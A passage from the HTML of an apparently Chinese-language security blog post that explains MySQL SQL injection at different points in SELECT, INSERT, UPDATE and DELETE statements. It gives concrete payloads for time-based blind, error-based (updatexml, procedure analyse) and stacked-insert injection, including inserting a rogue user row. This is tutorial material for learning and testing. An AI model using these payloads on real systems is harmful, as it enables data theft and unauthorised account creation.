[SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">    [SQL_CACHE <span class="operator">|</span> SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr] ...</span><br><span class="line">    [into_option]</span><br><span class="line">    [<span class="keyword">FROM</span> table_references</span><br><span class="line">      [<span class="keyword">PARTITION</span> partition_list]]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name <span class="operator">|</span> expr <span class="operator">|</span> position&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name <span class="operator">|</span> expr <span class="operator">|</span> position&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>], ...]</span><br><span class="line">    [LIMIT &#123;[<span class="keyword">offset</span>,] row_count <span class="operator">|</span> row_count <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">    [into_option]</span><br><span class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> <span class="operator">|</span> LOCK <span class="keyword">IN</span> SHARE MODE]</span><br><span class="line"></span><br><span class="line">into_option: &#123;</span><br><span class="line">    <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        export_options</span><br><span class="line">  <span class="operator">|</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">INTO</span> var_name [, var_name] ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="注入点在select之后，from之前"><a href="#注入点在select之后，from之前" class="headerlink" title="注入点在select之后，from之前"></a>注入点在select之后，from之前</h5><p>可以通过<code>as</code>别名将数据直接覆盖带出,比如正常查询是这样的</p>
<p><code>select username from user;</code></p>
<p>我们就可以这样利用<code>select (select password) as username from user;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192208285.png" alt="image-20221019220833245"></p>
<h5 id="注入点在引用表"><a href="#注入点在引用表" class="headerlink" title="注入点在引用表"></a>注入点在引用表</h5><p>这里分两种情况,如果表名被反引号包裹,需要现闭合反引号,这时候我们可以子查询</p>
<p>正常情况为:<code>select title, content from page</code></p>
<p>加入子查询后:<code>select title,content from (select user() as title,&#39;aaa&#39; as content) as b;</code></p>
<p>这样就可以通过title列把user()数据带出</p>
<h5 id="注入点在where条件以后"><a href="#注入点在where条件以后" class="headerlink" title="注入点在where条件以后"></a>注入点在where条件以后</h5><p>这里我们可以使用union联合查询</p>
<h5 id="注入点在group-by或者order-by之后"><a href="#注入点在group-by或者order-by之后" class="headerlink" title="注入点在group by或者order by之后"></a>注入点在group by或者order by之后</h5><p>正常情况下为:<code>select id,title,content from page order by 注入点;</code></p>
<p>这里可以配合时间盲注<code>select id,title,content from page order by id ,if(substr((select username from user where id =1),1,1)=&#39;a&#39; ,sleep(1),1);</code></p>
<h5 id="注入点在limit之后"><a href="#注入点在limit之后" class="headerlink" title="注入点在limit之后"></a>注入点在limit之后</h5><p><code>select id,title,content from page order by id limit 注入点;</code></p>
<p>由于limit之后,只能是数字,可以使用<code>procedure analyse</code>语法来实现报错注入,但是这种方式只能是MySQL5.6以前使用</p>
<p><code>select title,content from page limit 1 procedure analyse(updatexml(1,concat(0x3a,version(),0x3a),1));</code></p>
<h4 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h4><p>附官方文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/insert.html">https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/insert.html</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> [LOW_PRIORITY <span class="operator">|</span> DELAYED <span class="operator">|</span> HIGH_PRIORITY] [IGNORE]</span><br><span class="line">    [<span class="keyword">INTO</span>] tbl_name</span><br><span class="line">    [<span class="keyword">PARTITION</span> (partition_name [, partition_name] ...)]</span><br><span class="line">    [(col_name [, col_name] ...)]</span><br><span class="line">    &#123;<span class="keyword">VALUES</span> <span class="operator">|</span> <span class="keyword">VALUE</span>&#125; (value_list) [, (value_list)] ...</span><br><span class="line">    [<span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> assignment_list]</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> [LOW_PRIORITY <span class="operator">|</span> DELAYED <span class="operator">|</span> HIGH_PRIORITY] [IGNORE]</span><br><span class="line">    [<span class="keyword">INTO</span>] tbl_name</span><br><span class="line">    [<span class="keyword">PARTITION</span> (partition_name [, partition_name] ...)]</span><br><span class="line">    <span class="keyword">SET</span> assignment_list</span><br><span class="line">    [<span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> assignment_list]</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> [LOW_PRIORITY <span class="operator">|</span> HIGH_PRIORITY] [IGNORE]</span><br><span class="line">    [<span class="keyword">INTO</span>] tbl_name</span><br><span class="line">    [<span class="keyword">PARTITION</span> (partition_name [, partition_name] ...)]</span><br><span class="line">    [(col_name [, col_name] ...)]</span><br><span class="line">    <span class="keyword">SELECT</span> ...</span><br><span class="line">    [<span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> assignment_list]</span><br><span class="line"></span><br><span class="line"><span class="keyword">value</span>:</span><br><span class="line">    &#123;expr <span class="operator">|</span> <span class="keyword">DEFAULT</span>&#125;</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line">    <span class="keyword">value</span> [, <span class="keyword">value</span>] ...</span><br><span class="line"></span><br><span class="line">assignment:</span><br><span class="line">    col_name <span class="operator">=</span> <span class="keyword">value</span></span><br><span class="line"></span><br><span class="line">assignment_list:</span><br><span class="line">    assignment [, assignment] ...</span><br></pre></td></tr></table></figure>

<h5 id="注入点在要插入的表名"><a href="#注入点在要插入的表名" class="headerlink" title="注入点在要插入的表名"></a>注入点在要插入的表名</h5><p>通过劫持要插入的表，可以增加文章，这时候也可以增加一个用户表数据进去</p>
<p>正常情况下这样：<code>insert into page (title,content) values(&quot;page1&quot;,&quot;content1&quot;);</code></p>
<p>当我们可以控制表名的时候,就可以劫持插入<code>insert into user(username,password) values(&quot;111&quot;,&quot;111&quot;);#(title,content) values(&quot;page1&quot;,&quot;content1&quot;);</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210201801227.png" alt="image-20221020180130184"></p>
<h5 id="注入点在插入的值"><a href="#注入点在插入的值" class="headerlink" title="注入点在插入的值"></a>注入点在插入的值</h5><p><code> insert into page(title,content) values(&quot;注入点&quot;,&quot;xxx&quot;);</code></p>
<p><code>insert into page(title,content) values(&quot;123&quot;,&quot;123&quot;),(&quot;456&quot;,(select user()));#&quot;,&quot;xxx&quot;);</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210202159124.png" alt="image-20221020215901080"></p>
<h4 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><h5 id="注入点在set后边"><a href="#注入点在set后边" class="headerlink" title="注入点在set后边"></a>注入点在set后边</h5><p>和上面insert利用方法相似，可以通过修改多条数据实现数据回显</p>
<p><code>update page set title = &quot;注入点&quot; where id = 1;</code></p>
<p>我们可以通过这种方式注入</p>
<p><code>update page set title = &quot;123&quot;,content = (select user()) where id = 5 ;#&quot; where id = 1;</code></p>
<p>注入后,我们可以实现</p>
<p><code>update page set title = &quot;123&quot;, content = (select user()) where id = 5;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210202238966.png" alt="image-20221020223813925"></p>
<h5 id="注入点在values后面"><a href="#注入点在values后面" class="headerlink" title="注入点在values后面"></a>注入点在values后面</h5><p>如果注入点在value中,我们同样可以闭合括号,实现多个记录的修改,类似于insert方法</p>
<h4 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h4><h5 id="注入点在where之后"><a href="#注入点在where之后" class="headerlink" title="注入点在where之后"></a>注入点在where之后</h5><p>这里如果不小心就会删除表内所有的数据,所以需要一个特别的技巧</p>
<p>由于<code>select sleep(1);</code>恒返回0,所以在delete注入时,要确保不会影响表数据,造成下次没办法利用,所以我可以在注入点后</p>
<p><code>delete from page where id = 1 and sleep(1);</code></p>
<p>确保不会真的删除表数据</p>
<p><code> delete from page where id = 1  1 or updatexml(1, concat(0x7e, database()), 0) and sleep(1);</code></p>
<h5 id="注入点在表名中"><a href="#注入点在表名中" class="headerlink" title="注入点在表名中"></a>注入点在表名中</h5><p>可以使用报错注入回显数据,避免数据被删除</p>

            
        </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2022.04.28</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">Charmersix</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
